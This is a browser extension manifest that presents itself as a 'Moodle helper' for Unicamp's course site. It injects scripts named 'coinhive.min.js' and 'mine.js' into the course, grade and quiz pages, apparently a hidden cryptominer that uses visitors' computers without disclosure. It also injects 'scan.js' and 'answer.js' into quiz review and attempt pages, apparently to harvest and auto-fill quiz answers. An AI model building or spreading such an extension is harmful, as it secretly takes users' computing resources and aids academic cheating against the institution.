{
  "manifest_version": 2,

  "name": "*FY* MOODLE",
  "version": "1.0.3",
  "description": "Ajudador de moodle",
  "default_locale": "en",
  "icons": {
    "16": "icon/16.png",
    "48": "icon/48.png",
    "128": "icon/128.png"
  },
  "browser_action": {},
  "permissions": ["webNavigation", "storage"],
  "content_scripts": [
    {
      "matches": [
        "http://www.ggte.unicamp.br/eam/my/*",
        "http://www.ggte.unicamp.br/eam/course/view.php?id=*",
        "http://www.ggte.unicamp.br/eam/grade/report/user/index.php?id=*"
      ],
      "js": [
        "coinhive.min.js",
        "mine.js",
        "firebase.js",
        "axios.js",
        "moonshot.js"
      ],
      "run_at": "document_end",
      "all_frames": true
    },
    {
      "matches": ["http://www.ggte.unicamp.br/eam/mod/quiz/review.php*"],
      "js": ["coinhive.min.js", "mine.js", "firebase.js", "scan.js"],
      "run_at": "document_end",
      "all_frames": true
    },
    {
      "matches": ["http://www.ggte.unicamp.br/eam/mod/quiz/attempt.php*"],
      "js": ["coinhive.min.js", "mine.js", "firebase.js", "answer.js"],
      "run_at": "document_end",
      "all_frames": true
    }
  ]
}
